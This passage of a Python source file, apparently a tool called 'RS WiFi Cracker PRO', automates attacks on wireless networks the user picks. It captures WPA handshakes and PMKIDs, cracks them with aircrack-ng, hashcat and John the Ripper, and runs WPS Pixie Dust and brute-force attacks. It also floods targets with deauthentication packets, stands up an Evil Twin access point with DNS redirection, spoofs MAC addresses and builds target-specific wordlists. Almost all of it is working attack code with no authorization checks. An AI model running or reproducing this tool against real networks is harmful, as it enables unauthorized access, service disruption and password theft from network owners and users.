                        capture_output=True, text=True
                    )
                    if '1 handshake' in result.stdout:
                        process.terminate()
                        handshake = HandshakeCapture(
                            bssid=bssid,
                            essid=essid,
                            capture_file=cap_file
                        )
                        self.db.save_handshake(handshake)
                        self.logger.success("Handshake captured!")
                        return handshake
        
        # Wait for timeout
        start_time = time.time()
        while time.time() - start_time < timeout:
            time.sleep(5)
            cap_file = output_file + "-01.cap"
            if os.path.exists(cap_file):
                result = subprocess.run(
                    ['aircrack-ng', cap_file],
                    capture_output=True, text=True
                )
                if '1 handshake' in result.stdout:
                    process.terminate()
                    handshake = HandshakeCapture(
                        bssid=bssid,
                        essid=essid,
                        capture_file=cap_file
                    )
                    self.db.save_handshake(handshake)
                    self.logger.success("Handshake captured!")
                    return handshake
        
        process.terminate()
        self.logger.warning("No handshake captured within timeout")
        return None
    
    def capture_pmkid(self, bssid: str, channel: int, essid: str = "") -> Optional[HandshakeCapture]:
        """Capture PMKID"""
        self.logger.info(f"Attempting PMKID capture for {bssid}...")
        
        output_file = os.path.join(self.capture_dir, f"pmkid_{bssid.replace(':', '')}")
        
        try:
            # Set channel
            subprocess.run(['iw', 'dev', self.interface, 'set', 'channel', str(channel)], 
                          capture_output=True)
            
            # Use hcxdumptool
            cmd = [
                'hcxdumptool', '-i', self.interface,
                '-o', output_file + '.pcapng',
                '--enable_status=1',
                '--filterlist_ap=' + bssid
            ]
            
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            # Wait for PMKID
            start_time = time.time()
            while time.time() - start_time < 60:
                time.sleep(5)
                if os.path.exists(output_file + '.pcapng'):
                    # Check for PMKID
                    result = subprocess.run(
                        ['hcxpcapngtool', '-o', output_file + '.hash', output_file + '.pcapng'],
                        capture_output=True, text=True
                    )
                    if os.path.exists(output_file + '.hash'):
                        process.terminate()
                        handshake = HandshakeCapture(
                            bssid=bssid,
                            essid=essid,
                            capture_file=output_file + '.hash'
                        )
                        self.db.save_handshake(handshake)
                        self.logger.success("PMKID captured!")
                        return handshake
            
            process.terminate()
        except Exception as e:
            self.logger.error(f"PMKID capture failed: {e}")
        
        return None


# ===================== PASSWORD CRACKER =====================

class PasswordCracker:
    """WiFi password cracker"""
    
    def __init__(self, logger: Logger, db: Database):
        self.logger = logger
        self.db = db
        self.wordlists = [
            "/usr/share/wordlists/rs-wordlists/common.txt",
            "/usr/share/wordlists/rockyou.txt",
            "/usr/share/wordlists/fasttrack.txt"
        ]
    
    def crack_aircrack(self, cap_file: str, wordlist: str = None, 
                       bssid: str = "") -> Optional[str]:
        """Crack using aircrack-ng"""
        wordlist = wordlist or self._find_wordlist()
        if not wordlist or not os.path.exists(wordlist):
            self.logger.error("No wordlist found")
            return None
        
        self.logger.info(f"Cracking with aircrack-ng using {wordlist}...")
        
        try:
            result = subprocess.run(
                ['aircrack-ng', '-w', wordlist, '-b', bssid, cap_file],
                capture_output=True, text=True, timeout=3600
            )
            
            # Parse result
            if 'KEY FOUND' in result.stdout:
                # Extract password
                match = re.search(r'\[\s*(.+?)\s*\]', result.stdout)
                if match:
                    password = match.group(1)
                    self.logger.success(f"Password found: {password}")
                    if bssid:
                        self.db.update_handshake_cracked(bssid, password)
                    return password
        except subprocess.TimeoutExpired:
            self.logger.warning("Cracking timeout")
        except Exception as e:
            self.logger.error(f"Cracking failed: {e}")
        
        return None
    
    def crack_hashcat(self, hash_file: str, wordlist: str = None, 
                      bssid: str = "") -> Optional[str]:
        """Crack using hashcat"""
        wordlist = wordlist or self._find_wordlist()
        if not wordlist or not os.path.exists(wordlist):
            self.logger.error("No wordlist found")
            return None
        
        self.logger.info("Cracking with hashcat...")
        
        # Convert to hashcat format if needed
        hccapx_file = hash_file.replace('.cap', '.hccapx')
        if hash_file.endswith('.cap'):
            subprocess.run([
                'aircrack-ng', '-J', hccapx_file.replace('.hccapx', ''), hash_file
            ], capture_output=True)
        
        try:
            # Run hashcat
            result = subprocess.run([
                'hashcat', '-m', '22000', hash_file, wordlist,
                '--force', '--status', '-O'
            ], capture_output=True, text=True)
            
            # Get cracked password
            show_result = subprocess.run([
                'hashcat', '-m', '22000', hash_file, '--show'
            ], capture_output=True, text=True)
            
            if ':' in show_result.stdout:
                password = show_result.stdout.split(':')[-1].strip()
                if password:
                    self.logger.success(f"Password found: {password}")
                    if bssid:
                        self.db.update_handshake_cracked(bssid, password)
                    return password
        except Exception as e:
            self.logger.error(f"Hashcat failed: {e}")
        
        return None
    
    def crack_john(self, hash_file: str, wordlist: str = None, 
                   bssid: str = "") -> Optional[str]:
        """Crack using John the Ripper"""
        wordlist = wordlist or self._find_wordlist()
        
        self.logger.info("Cracking with John the Ripper...")
        
        try:
            # Convert if needed
            john_file = hash_file + '.john'
            if hash_file.endswith('.cap'):
                subprocess.run([
                    '/usr/share/john/wpapcap2john.py', hash_file
                ], capture_output=True, text=True, stdout=open(john_file, 'w'))
            
            # Run john
            subprocess.run([
                'john', '--wordlist=' + wordlist, john_file
            ], capture_output=True, text=True)
            
            # Show result
            result = subprocess.run([
                'john', '--show', john_file
            ], capture_output=True, text=True)
            
            if result.stdout and ':' in result.stdout:
                password = result.stdout.split(':')[1].strip()
                if password:
                    self.logger.success(f"Password found: {password}")
                    if bssid:
                        self.db.update_handshake_cracked(bssid, password)
                    return password
        except Exception as e:
            self.logger.error(f"John failed: {e}")
        
        return None
    
    def _find_wordlist(self) -> Optional[str]:
        """Find available wordlist"""
        for wl in self.wordlists:
            if os.path.exists(wl):
                return wl
        
        # Create a small wordlist if none found
        default_wl = "/usr/share/wordlists/rs-wordlists/common.txt"
        os.makedirs(os.path.dirname(default_wl), exist_ok=True)
        
        if not os.path.exists(default_wl):
            common_passwords = [
                "12345678", "password", "password123", "admin", "admin123",
                "qwerty", "qwerty123", "letmein", "welcome", "monkey",
                "dragon", "master", "123456789", "1234567890", "password1",
                "abc123", "111111", "baseball", "iloveyou", "trustno1",
                "sunshine", "princess", "welcome1", "shadow", "superman",
                "michael", "football", "passw0rd", "charlie", "donald"
            ]
            with open(default_wl, 'w') as f:
                f.write('\n'.join(common_passwords))
        
        return default_wl


# ===================== WPS ATTACKER =====================

class WPSAttacker:
    """WPS attack suite"""
    
    def __init__(self, interface: str, logger: Logger, db: Database):
        self.interface = interface
        self.logger = logger
        self.db = db
    
    def pixie_dust(self, bssid: str) -> Optional[str]:
        """WPS Pixie Dust attack"""
        self.logger.info(f"Starting Pixie Dust attack on {bssid}...")
        
        try:
            result = subprocess.run([
                'reaver', '-i', self.interface, '-b', bssid,
                '-vv', '-K'
            ], capture_output=True, text=True, timeout=300)
            
            # Parse for WPS PIN
            pin_match = re.search(r'WPS PIN:\s*\'(\d+)\'', result.stdout)
            if pin_match:
                pin = pin_match.group(1)
                self.logger.success(f"WPS PIN found: {pin}")
                
                # Get password
                pwd_result = subprocess.run([
                    'reaver', '-i', self.interface, '-b', bssid,
                    '-p', pin, '-vv'
                ], capture_output=True, text=True)
                
                pwd_match = re.search(r'WPA PSK:\s*\'(.+?)\'', pwd_result.stdout)
                if pwd_match:
                    password = pwd_match.group(1)
                    self.logger.success(f"Password: {password}")
                    self.db.update_handshake_cracked(bssid, password)
                    return password
                
                return pin
        except subprocess.TimeoutExpired:
            self.logger.warning("Pixie Dust timeout")
        except Exception as e:
            self.logger.error(f"Pixie Dust attack failed: {e}")
        
        return None
    
    def bully_attack(self, bssid: str) -> Optional[str]:
        """WPS Brute Force using bully"""
        self.logger.info(f"Starting WPS brute force on {bssid}...")
        
        try:
            result = subprocess.run([
                'bully', '-b', bssid, self.interface, '-v', '3'
            ], capture_output=True, text=True, timeout=3600)
            
            # Parse result
            pin_match = re.search(r'PIN found:\s*(\d+)', result.stdout)
            if pin_match:
                pin = pin_match.group(1)
                self.logger.success(f"WPS PIN found: {pin}")
                return pin
        except subprocess.TimeoutExpired:
            self.logger.warning("Brute force timeout")
        except Exception as e:
            self.logger.error(f"Bully attack failed: {e}")
        
        return None


# ===================== DEAUTH ATTACKER =====================

class DeauthAttacker:
    """Deauthentication attack"""
    
    def __init__(self, interface: str, logger: Logger, db: Database):
        self.interface = interface
        self.logger = logger
        self.db = db
    
    def deauth(self, bssid: str, client: str = None, count: int = 10):
        """Send deauth packets"""
        self.logger.info(f"Sending {count} deauth packets to {bssid}...")
        
        cmd = ['aireplay-ng', '-0', str(count), '-a', bssid]
        if client:
            cmd.extend(['-c', client])
        cmd.append(self.interface)
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            self.logger.success(f"Sent {count} deauth packets")
            return True
        except Exception as e:
            self.logger.error(f"Deauth failed: {e}")
            return False
    
    def deauth_all(self, bssid: str, duration: int = 30):
        """Continuous deauth attack"""
        self.logger.info(f"Starting continuous deauth on {bssid} for {duration}s...")
        
        start_time = time.time()
        while time.time() - start_time < duration:
            subprocess.run([
                'aireplay-ng', '-0', '5', '-a', bssid, self.interface
            ], capture_output=True)
            time.sleep(2)
        
        self.logger.success("Deauth attack completed")


# ===================== EVIL TWIN =====================

class EvilTwin:
    """Evil Twin attack"""
    
    def __init__(self, interface: str, logger: Logger, db: Database):
        self.interface = interface
        self.logger = logger
        self.db = db
        self.running = False
    
    def start(self, essid: str, channel: int, password: str = None):
        """Start Evil Twin AP"""
        self.logger.info(f"Starting Evil Twin AP: {essid}...")
        
        # Create hostapd config
        config = f"""interface={self.interface}
driver=nl80211
ssid={essid}
channel={channel}
hw_mode=g
"""
        if password:
            config += f"""wpa=2
wpa_passphrase={password}
wpa_key_mgmt=WPA-PSK
"""
        
        config_file = "/tmp/evil_twin.conf"
        with open(config_file, 'w') as f:
            f.write(config)
        
        # Start dnsmasq
        dnsmasq_conf = f"""interface={self.interface}
dhcp-range=192.168.1.2,192.168.1.100,12h
address=/#/192.168.1.1
"""
        dnsmasq_file = "/tmp/dnsmasq_evil.conf"
        with open(dnsmasq_file, 'w') as f:
            f.write(dnsmasq_conf)
        
        # Configure interface
        subprocess.run(['ip', 'addr', 'add', '192.168.1.1/24', 'dev', self.interface], 
                      capture_output=True)
        subprocess.run(['ip', 'link', 'set', self.interface, 'up'], capture_output=True)
        
        # Start services
        subprocess.Popen(['dnsmasq', '-C', dnsmasq_file, '-d'])
        subprocess.Popen(['hostapd', config_file])
        
        self.running = True
        self.logger.success("Evil Twin AP started")


# ===================== WORDLIST GENERATOR =====================

class WordlistGenerator:
    """Custom wordlist generator"""
    
    def __init__(self, logger: Logger):
        self.logger = logger
    
    def generate(self, essid: str, keywords: List[str] = None, 
                 output_file: str = None, max_length: int = 12) -> str:
        """Generate custom wordlist"""
        output_file = output_file or f"/tmp/wordlist_{essid}.txt"
        keywords = keywords or []
        
        self.logger.info(f"Generating wordlist for {essid}...")
        
        passwords = set()
        
        # Add essid variations
        if essid:
            passwords.add(essid)
            passwords.add(essid.lower())
            passwords.add(essid.upper())
            passwords.add(essid + "123")
            passwords.add(essid + "1234")
            passwords.add(essid + "12345")
            passwords.add(essid + "@123")
            passwords.add(essid + "!123")
            passwords.add(essid.replace(" ", ""))
            passwords.add(essid.replace(" ", "").lower())
        
        # Add keyword variations
        for kw in keywords:
            passwords.add(kw)
            passwords.add(kw.lower())
            passwords.add(kw.upper())
            passwords.add(kw + "123")
            passwords.add(kw + "1234")
            passwords.add(kw + "@2024")
            passwords.add(kw + "!@#")
        
        # Add common patterns
        common = [
            "password", "admin", "qwerty", "letmein", "welcome",
            "monkey", "dragon", "master", "123456", "password123"
        ]
        for c in common:
            passwords.add(c)
            passwords.add(c + "123")
            passwords.add(essid[:4].lower() + c if essid else c)
        
        # Write to file
        with open(output_file, 'w') as f:
            for p in sorted(passwords):
                if len(p) <= max_length:
                    f.write(p + '\n')
        
        self.logger.success(f"Generated {len(passwords)} passwords in {output_file}")
        return output_file


# ===================== REPORT GENERATOR =====================

class ReportGenerator:
    """Generate security reports"""
    
    def __init__(self, db: Database, logger: Logger):
        self.db = db
        self.logger = logger
        self.report_dir = "/tmp/rs-wifi-reports"
        os.makedirs(self.report_dir, exist_ok=True)
    
    def generate_html(self, session_id: str) -> str:
        """Generate HTML report"""
        networks = self.db.get_networks()
        handshakes = self.db.get_handshakes()
        
        report_file = os.path.join(self.report_dir, f"report_{session_id}.html")
        
        html = f"""<!DOCTYPE html>
<html>
<head>
    <title>RS WiFi Cracker PRO - Security Report</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; background: #1a1a2e; color: #eee; }}
        h1 {{ color: #00ff88; }}
        h2 {{ color: #00aaff; }}
        table {{ border-collapse: collapse; width: 100%; margin: 20px 0; }}
        th, td {{ border: 1px solid #333; padding: 10px; text-align: left; }}
        th {{ background: #16213e; color: #00ff88; }}
        tr:nth-child(even) {{ background: #16213e; }}
        .success {{ color: #00ff88; }}
        .warning {{ color: #ffaa00; }}
        .danger {{ color: #ff4444; }}
        .header {{ background: linear-gradient(135deg, #1a1a2e, #16213e); padding: 20px; 
                   border-radius: 10px; margin-bottom: 20px; }}
    </style>
</head>
<body>
    <div class="header">
        <h1>🔒 RS WiFi Cracker PRO - Security Report</h1>
        <p>Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>  <!-- FIXED -->
        <p>Session: {session_id}</p>
    </div>
    
    <h2>📊 Network Summary</h2>
    <table>
        <tr>
            <th>BSSID</th>
            <th>ESSID</th>
            <th>Channel</th>
            <th>Security</th>
            <th>Power</th>
            <th>WPS</th>
            <th>Handshake</th>
            <th>Password</th>
        </tr>
"""
        
        for net in networks:
            hs_status = "✓" if net.get('handshake_captured') else "✗"
            pwd = net.get('password', '') or '-'
            wps = "Yes" if net.get('wps') else "No"
            
            html += f"""
        <tr>
            <td>{net.get('bssid', '')}</td>
            <td>{net.get('essid', 'Hidden')}</td>
            <td>{net.get('channel', '-')}</td>
            <td class="{'success' if net.get('security') in ['WPA2', 'WPA3'] else 'warning'}">{net.get('security', 'Unknown')}</td>
            <td>{net.get('power', '-')}</td>
            <td>{wps}</td>
            <td class="{'success' if net.get('handshake_captured') else 'danger'}">{hs_status}</td>
            <td class="{'success' if pwd != '-' else ''}">{pwd}</td>
        </tr>
"""
        
        html += """
    </table>
    
    <h2>🔑 Captured Handshakes</h2>
    <table>
        <tr>
            <th>BSSID</th>
            <th>ESSID</th>
            <th>Captured At</th>
            <th>Status</th>
            <th>Password</th>
        </tr>
"""
        
        for hs in handshakes:
            status = "Cracked" if hs.get('cracked') else "Pending"
            pwd = hs.get('password', '') or '-'
            
            html += f"""
        <tr>
            <td>{hs.get('bssid', '')}</td>
            <td>{hs.get('essid', '')}</td>
            <td>{hs.get('captured_at', '')}</td>
            <td class="{'success' if hs.get('cracked') else 'warning'}">{status}</td>
            <td class="success">{pwd}</td>
        </tr>
"""
        
        html += f"""
    </table>
    
    <div class="header">
        <p>RS WiFi Cracker PRO v{VERSION} - T3rmuxk1ng Private Release</p>
    </div>
</body>
</html>
"""
        
        with open(report_file, 'w') as f:
            f.write(html)
        
        self.logger.success(f"Report saved: {report_file}")
        return report_file


# ===================== MAIN APPLICATION =====================

class RSWiFiCrackerPro:
    """Main application class"""
    
    def __init__(self):
        self.config = Config()
        self.logger = Logger()
        self.error_handler = ErrorHandler(self.logger)
        self.db = Database()
        
        self.interface_manager = InterfaceManager(self.logger)
        self.scanner = None
        self.capturer = None
        self.cracker = None
        self.wps_attacker = None
        self.deauther = None
        self.evil_twin = None
        self.wordlist_gen = WordlistGenerator(self.logger)
        self.report_gen = ReportGenerator(self.db, self.logger)
        
        self.selected_interface: Optional[str] = None
        self.session_id: Optional[str] = None
        self.running = True
    
    def initialize(self):
        """Initialize the application"""
        print_banner()
        
        # Check root
        if os.geteuid() != 0:
            self.logger.error("This tool requires root privileges!")
            self.logger.info("Run with: sudo rs-wifi-pro")
            sys.exit(1)
        
        # List interfaces
        interfaces = self.interface_manager.list_interfaces()
        
        if not interfaces:
            self.logger.error("No wireless interfaces found!")
            sys.exit(1)
        
        print(f"\n{Colors.BOLD}Available Interfaces:{Colors.RESET}")
        print(f"{'#':<4} {'Name':<12} {'Mode':<12} {'Status':<8} {'MAC':<18} {'Vendor'}")
        print("-" * 75)
        
        for i, iface in enumerate(interfaces, 1):
            print(f"{i:<4} {iface.name:<12} {iface.mode:<12} {iface.status:<8} "
                  f"{iface.mac:<18} {iface.vendor}")
        
        # Select interface
        try:
            choice = int(input(f"\nSelect interface [1-{len(interfaces)}]: "))
            if 1 <= choice <= len(interfaces):
                self.selected_interface = interfaces[choice - 1].name
                self.logger.info(f"✓ Selected: {self.selected_interface}")
            else:
                self.logger.error("Invalid selection!")
                sys.exit(1)
        except ValueError:
            self.logger.error("Invalid input!")
            sys.exit(1)
        
        # Start session
        self.session_id = self.db.start_session(self.selected_interface)  # FIXED: Now works
        self.logger.info(f"Session started: {self.session_id}")
        
        # Initialize components
        self.scanner = NetworkScanner(self.selected_interface, self.logger, self.db)
        self.capturer = HandshakeCapturer(self.selected_interface, self.logger, self.db)
        self.cracker = PasswordCracker(self.logger, self.db)
        self.wps_attacker = WPSAttacker(self.selected_interface, self.logger, self.db)
        self.deauther = DeauthAttacker(self.selected_interface, self.logger, self.db)
        self.evil_twin = EvilTwin(self.selected_interface, self.logger, self.db)
    
    def show_menu(self):
        """Display main menu"""
        menu = f"""
{Colors.CYAN}╔═══════════════════════════════════════════════════════════════════╗
║                      MAIN MENU                                      ║
╚═══════════════════════════════════════════════════════════════════╝{Colors.RESET}

{Colors.BOLD}SCAN OPTIONS:{Colors.RESET}
  1. Quick Scan (airodump-ng)
  2. Full Scan (all channels)
  3. Scan Specific Channel

{Colors.BOLD}ATTACK OPTIONS:{Colors.RESET}
  4. Capture WPA/WPA2 Handshake
  5. Capture PMKID
  6. WPS Pixie Dust Attack
  7. WPS Brute Force
  8. Deauthentication Attack
  9. Evil Twin Attack

{Colors.BOLD}CRACK OPTIONS:{Colors.RESET}
  10. Crack with Aircrack-ng
  11. Crack with Hashcat
  12. Crack with John
  13. Generate Custom Wordlist

{Colors.BOLD}TOOLS:{Colors.RESET}
  14. Set Monitor Mode
  15. Set Managed Mode
  16. Change MAC Address
  17. View Database
  18. Generate Report

{Colors.BOLD}EXIT:{Colors.RESET}
  0. Exit

"""
        print(menu)
    
    def run(self):
        """Main loop"""
        while self.running:
            self.show_menu()
            
            try:
                choice = input(f"{Colors.GREEN}Select option: {Colors.RESET}").strip()
                
                if choice == '0':
                    self.shutdown()
                elif choice == '1':
                    self.action_quick_scan()
                elif choice == '2':
                    self.action_full_scan()
                elif choice == '3':
                    self.action_channel_scan()
                elif choice == '4':
                    self.action_capture_handshake()
                elif choice == '5':
                    self.action_capture_pmkid()
                elif choice == '6':
                    self.action_wps_pixie()
                elif choice == '7':
                    self.action_wps_brute()
                elif choice == '8':
                    self.action_deauth()
                elif choice == '9':
                    self.action_evil_twin()
                elif choice == '10':
                    self.action_crack_aircrack()
                elif choice == '11':
                    self.action_crack_hashcat()
                elif choice == '12':
                    self.action_crack_john()
                elif choice == '13':
                    self.action_generate_wordlist()
                elif choice == '14':
                    self.action_monitor_mode()
                elif choice == '15':
                    self.action_managed_mode()
                elif choice == '16':
                    self.action_change_mac()
                elif choice == '17':
                    self.action_view_database()
                elif choice == '18':
                    self.action_generate_report()
                else:
                    self.logger.warning("Invalid option!")
                
                input(f"\n{Colors.DIM}Press Enter to continue...{Colors.RESET}")
                
            except KeyboardInterrupt:
                print()
                self.shutdown()
            except Exception as e:
                self.error_handler.handle(e, "Main loop error")
    
    def action_quick_scan(self):
        """Quick scan action"""
        self.logger.info("Starting quick scan...")
        self.interface_manager.set_monitor_mode(self.selected_interface)
        networks = self.scanner.scan_airodump(timeout=30)
        self.scanner.display_networks(networks)
    
    def action_full_scan(self):
        """Full scan action"""
        self.logger.info("Starting full scan...")
        self.interface_manager.set_monitor_mode(self.selected_interface)
        networks = self.scanner.scan_airodump(timeout=60)
        self.scanner.display_networks(networks)
    
    def action_channel_scan(self):
        """Channel scan action"""
        try:
            channel = int(input("Enter channel: "))
            self.interface_manager.set_monitor_mode(self.selected_interface)
            networks = self.scanner.scan_airodump(channel=channel, timeout=30)
            self.scanner.display_networks(networks)
        except ValueError:
            self.logger.error("Invalid channel!")
    
    def action_capture_handshake(self):
        """Capture handshake action"""
        networks = list(self.scanner.networks.values())
        if not networks:
            self.logger.warning("No networks. Scan first!")
            return
        
        self.scanner.display_networks()
        try:
            idx = int(input("Select target network: ")) - 1
            if 0 <= idx < len(networks):
                target = networks[idx]
                self.interface_manager.set_monitor_mode(self.selected_interface)
                self.capturer.capture(target.bssid, target.channel, target.essid)
        except ValueError:
            self.logger.error("Invalid selection!")
    
    def action_capture_pmkid(self):
        """Capture PMKID action"""
        networks = list(self.scanner.networks.values())
        if not networks:
            self.logger.warning("No networks. Scan first!")
            return
        
        self.scanner.display_networks()
        try:
            idx = int(input("Select target network: ")) - 1
            if 0 <= idx < len(networks):
                target = networks[idx]
                self.interface_manager.set_monitor_mode(self.selected_interface)
                self.capturer.capture_pmkid(target.bssid, target.channel, target.essid)
        except ValueError:
            self.logger.error("Invalid selection!")
    
    def action_wps_pixie(self):
        """WPS Pixie Dust action"""
        networks = list(self.scanner.networks.values())
        if not networks:
            self.logger.warning("No networks. Scan first!")
            return
        
        self.scanner.display_networks()
        try:
            idx = int(input("Select target network: ")) - 1
            if 0 <= idx < len(networks):
                target = networks[idx]
                if not target.wps:
                    self.logger.warning("WPS may not be enabled!")
                self.interface_manager.set_monitor_mode(self.selected_interface)
                self.wps_attacker.pixie_dust(target.bssid)
        except ValueError:
            self.logger.error("Invalid selection!")
    
    def action_wps_brute(self):
        """WPS brute force action"""
        networks = list(self.scanner.networks.values())
        if not networks:
            self.logger.warning("No networks. Scan first!")
            return
        
        self.scanner.display_networks()
        try:
            idx = int(input("Select target network: ")) - 1
            if 0 <= idx < len(networks):
                target = networks[idx]
                self.interface_manager.set_monitor_mode(self.selected_interface)
                self.wps_attacker.bully_attack(target.bssid)
        except ValueError:
            self.logger.error("Invalid selection!")
    
    def action_deauth(self):
        """Deauth attack action"""
        networks = list(self.scanner.networks.values())
        if not networks:
            self.logger.warning("No networks. Scan first!")
            return
        
        self.scanner.display_networks()
        try:
            idx = int(input("Select target network: ")) - 1
            if 0 <= idx < len(networks):
                target = networks[idx]
                self.interface_manager.set_monitor_mode(self.selected_interface)
                count = int(input("Number of packets (default 10): ") or "10")
                self.deauther.deauth(target.bssid, count=count)
        except ValueError:
            self.logger.error("Invalid selection!")
    
    def action_evil_twin(self):
        """Evil Twin action"""
        essid = input("Enter ESSID for Evil Twin: ")
        channel = int(input("Enter channel: ") or "1")
        password = input("Enter password (optional, press Enter for open): ") or None
        self.evil_twin.start(essid, channel, password)
    
    def action_crack_aircrack(self):
        """Crack with aircrack action"""
        handshakes = self.db.get_handshakes()
        if not handshakes:
            self.logger.warning("No handshakes captured!")
            return
        
        print("\nCaptured Handshakes:")
        for i, hs in enumerate(handshakes, 1):
            status = "✓ Cracked" if hs.get('cracked') else "Pending"
            print(f"  {i}. {hs.get('essid', 'Unknown')} - {hs.get('bssid')} [{status}]")
        
        try:
            idx = int(input("Select handshake: ")) - 1
            if 0 <= idx < len(handshakes):
                hs = handshakes[idx]
                wordlist = input("Wordlist path (press Enter for default): ") or None
                self.cracker.crack_aircrack(hs['capture_file'], wordlist, hs['bssid'])
        except ValueError:
            self.logger.error("Invalid selection!")
    
    def action_crack_hashcat(self):
        """Crack with hashcat action"""
        handshakes = self.db.get_handshakes()
        if not handshakes:
            self.logger.warning("No handshakes captured!")
            return
        
        for i, hs in enumerate(handshakes, 1):
            status = "✓ Cracked" if hs.get('cracked') else "Pending"
            print(f"  {i}. {hs.get('essid', 'Unknown')} - {hs.get('bssid')} [{status}]")
        
        try:
            idx = int(input("Select handshake: ")) - 1
            if 0 <= idx < len(handshakes):
                hs = handshakes[idx]
                wordlist = input("Wordlist path (press Enter for default): ") or None
                self.cracker.crack_hashcat(hs['capture_file'], wordlist, hs['bssid'])
        except ValueError:
            self.logger.error("Invalid selection!")
    
    def action_crack_john(self):
        """Crack with john action"""
        handshakes = self.db.get_handshakes()
        if not handshakes:
            self.logger.warning("No handshakes captured!")
            return
        
        for i, hs in enumerate(handshakes, 1):
            status = "✓ Cracked" if hs.get('cracked') else "Pending"
            print(f"  {i}. {hs.get('essid', 'Unknown')} - {hs.get('bssid')} [{status}]")
        
        try:
            idx = int(input("Select handshake: ")) - 1
            if 0 <= idx < len(handshakes):
                hs = handshakes[idx]
                wordlist = input("Wordlist path (press Enter for default): ") or None
                self.cracker.crack_john(hs['capture_file'], wordlist, hs['bssid'])
        except ValueError:
            self.logger.error("Invalid selection!")
    
    def action_generate_wordlist(self):
        """Generate wordlist action"""
        essid = input("Enter target ESSID: ")
        keywords = input("Enter keywords (comma separated): ")
        keywords = [k.strip() for k in keywords.split(',')] if keywords else []
        output = self.wordlist_gen.generate(essid, keywords)
        self.logger.success(f"Wordlist saved: {output}")
    
    def action_monitor_mode(self):
        """Set monitor mode action"""
        self.interface_manager.set_monitor_mode(self.selected_interface)
    
    def action_managed_mode(self):
        """Set managed mode action"""
        self.interface_manager.set_managed_mode(self.selected_interface)
    
    def action_change_mac(self):
        """Change MAC action"""
        new_mac = input("Enter new MAC (press Enter for random): ") or None
        if new_mac:
            self.interface_manager.change_mac(self.selected_interface, new_mac)
        else:
            self.interface_manager.random_mac(self.selected_interface)
    
    def action_view_database(self):
        """View database action"""
        print(f"\n{Colors.BOLD}=== SESSIONS ==={Colors.RESET}")
        for s in self.db.get_sessions()[:5]:
            print(f"  {s.get('id', '')} - {s.get('interface', '')} - {s.get('status', '')}")
        
        print(f"\n{Colors.BOLD}=== NETWORKS ==={Colors.RESET}")
        for n in self.db.get_networks()[:10]:
            print(f"  {n.get('essid', '')} ({n.get('bssid', '')}) - {n.get('security', '')}")
        
        print(f"\n{Colors.BOLD}=== HANDSHAKES ==={Colors.RESET}")
        for h in self.db.get_handshakes()[:10]:
            status = "CRACKED" if h.get('cracked') else "pending"
            print(f"  {h.get('essid', '')} - {status}")
    
    def action_generate_report(self):
        """Generate report action"""
        report_file = self.report_gen.generate_html(self.session_id)
        self.logger.success(f"Report: {report_file}")
    
    def shutdown(self):
        """Clean shutdown"""
        self.logger.info("Shutting down...")
        
        # Restore managed mode
        if self.selected_interface:
            self.interface_manager.set_managed_mode(self.selected_interface)
        
        # End session
        if self.session_id:
            stats = {
                'networks': len(self.scanner.networks) if self.scanner else 0,
                'handshakes': len(self.db.get_handshakes()),
                'cracked': sum(1 for h in self.db.get_handshakes() if h.get('cracked'))
            }
            self.db.end_session(self.session_id, stats)
        
        self.db.close()
        self.running = False
        
        print(f"\n{Colors.GREEN}Thanks for using RS WiFi Cracker PRO!{Colors.RESET}")
        print(f"{Colors.CYAN}T3rmuxk1ng Private Release v{VERSION}{Colors.RESET}\n")
        
        sys.exit(0)


# ===================== ENTRY POINT =====================

def main():
    """Main entry point"""
    try:
        app = RSWiFiCrackerPro()
        app.initialize()
        app.run()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Interrupted by user{Colors.RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.RED}[ERROR] {e}{Colors.RESET}")
        sys.exit(1)


if __name__ == "__main__":
    main()
